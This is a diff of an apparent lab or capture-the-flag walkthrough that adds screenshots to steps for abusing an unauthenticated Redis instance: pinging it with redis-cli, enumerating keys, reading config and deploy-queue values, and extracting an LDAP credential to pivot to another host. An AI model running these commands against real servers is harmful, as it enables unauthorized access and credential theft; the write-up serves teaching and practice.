@@ -34,6 +34,13 @@ redis-cli -h 203.x.x.x -p 6379 ping
 redis-cli -h 203.x.x.x -p 6379 info server | head -10
 ```
 
+<img width="1175" height="155" alt="image" src="https://github.com/user-attachments/assets/042b073d-3556-400a-aa16-5a290ababc18" />
+
+
+<img width="1048" height="391" alt="image" src="https://github.com/user-attachments/assets/567e153b-b2f2-4f2f-bc52-0db387b5db25" />
+
+
+
 No `NOAUTH` error confirms the instance requires no password.
 
 ### Step 2 — Enumerate All Keys
@@ -51,6 +58,9 @@ Expected output:
 5) "pul:ratelimit:203.0.1.X"
 ```
 
+<img width="726" height="262" alt="image" src="https://github.com/user-attachments/assets/05febbe4-6552-42da-a493-a0436f20cf39" />
+
+
 ### Step 3 — Read Sensitive Keys
 
 ```bash
@@ -67,6 +77,9 @@ redis-cli -h 203.x.x.x -p 6379 GET "pul:config:app"
 redis-cli -h 203.x.x.x -p 6379 LRANGE "pul:queue:deploy" 0 -1
 ```
 
+<img width="2006" height="562" alt="image" src="https://github.com/user-attachments/assets/9eb877b5-acca-48b6-b703-30d48f307c02" />
+
+
 ### Step 4 — Extract the Pivot Credential
 
 From `pul:config:ldap`:
@@ -80,6 +93,8 @@ From `pul:config:ldap`:
   "note": "Internal LDAP for IT-Ops zone — RNG-IT-02 directory service"
 }
 ```
+<img width="2017" height="171" alt="image" src="https://github.com/user-attachments/assets/4963598f-b499-4fba-b5a0-fc6dd4db2e44" />
+
 
 **Pivot credential for RNG-IT-02:**
 - **LDAP Host:** `203.x.x.x:389`
